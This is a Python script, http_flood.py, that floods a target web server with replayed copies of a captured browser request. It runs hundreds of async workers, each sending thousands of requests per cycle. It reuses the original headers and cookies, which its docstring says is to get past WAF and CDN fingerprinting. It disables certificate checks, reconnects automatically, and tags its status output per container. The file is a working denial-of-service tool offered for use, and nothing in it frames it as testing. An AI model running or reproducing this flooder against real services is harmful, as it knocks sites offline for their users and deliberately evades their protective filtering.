#!/usr/bin/env python3
"""
Author: @kr1shn4murt1
http_flood.py — High-volume HTTP request replay.
Replays the exact captured browser request at maximum speed using async I/O.
Uses all original headers and cookies to bypass WAF/CDN fingerprinting.
"""

import asyncio
import ssl
import time
import sys
import os

from request_loader import load_request_data, build_raw_headers

REQUESTS_PER_CYCLE = int(os.environ.get("REQUESTS_PER_CYCLE", "10000"))
PARALLEL_WORKERS = int(os.environ.get("PARALLEL_WORKERS", "200"))
SLEEP_INTERVAL = float(os.environ.get("SLEEP_INTERVAL", "5"))
CONTAINER_NAME = os.environ.get("CONTAINER_NAME", "instance-1")
NUM_CONNECTIONS = int(sys.argv[1]) if len(sys.argv) > 1 else PARALLEL_WORKERS

CONNECT_TIMEOUT = 15
RECONNECT_DELAY = 2

total_sent = 0
total_errors = 0
lock = asyncio.Lock()


async def flood_worker(cid: int, req: dict):
    global total_sent, total_errors

    use_ssl = req["scheme"] == "https"
    ssl_ctx = None
    if use_ssl:
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE

    raw = build_raw_headers(req)
    if req["body"]:
        if "Content-Length" not in raw:
            raw += f"Content-Length: {len(req['body'])}\r\n"
        raw += "\r\n" + req["body"]
    else:
        raw += "\r\n"

    payload = raw.encode()

    while True:
        writer = None
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(req["host"], req["port"], ssl=ssl_ctx),
                timeout=CONNECT_TIMEOUT,
            )

            for _ in range(REQUESTS_PER_CYCLE):
                writer.write(payload)
                await writer.drain()

                try:
                    await asyncio.wait_for(reader.read(4096), timeout=5)
                except asyncio.TimeoutError:
                    pass

                async with lock:
                    total_sent += 1

                await asyncio.sleep(SLEEP_INTERVAL / PARALLEL_WORKERS)

        except Exception:
            async with lock:
                total_errors += 1
            await asyncio.sleep(RECONNECT_DELAY)

        finally:
            if writer:
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass


async def status_reporter():
    start = time.time()
    while True:
        await asyncio.sleep(30)
        elapsed = int(time.time() - start)
        rps = total_sent / max(elapsed, 1)
        print(
            f"[{CONTAINER_NAME}] T+{elapsed}s | "
            f"sent={total_sent} ({rps:.0f}/s) | errors={total_errors}",
            flush=True,
        )


async def main():
    req = load_request_data()
    print(f"[{CONTAINER_NAME}] HTTP Flood — {NUM_CONNECTIONS} workers", flush=True)
    print(f"[{CONTAINER_NAME}] Target: {req['method']} {req['url']}", flush=True)
    print(f"[{CONTAINER_NAME}] Headers: {len(req['headers'])} | Cookies: {len(req['cookies'])}", flush=True)

    tasks = [asyncio.create_task(flood_worker(i, req)) for i in range(NUM_CONNECTIONS)]
    tasks.append(asyncio.create_task(status_reporter()))
    await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())
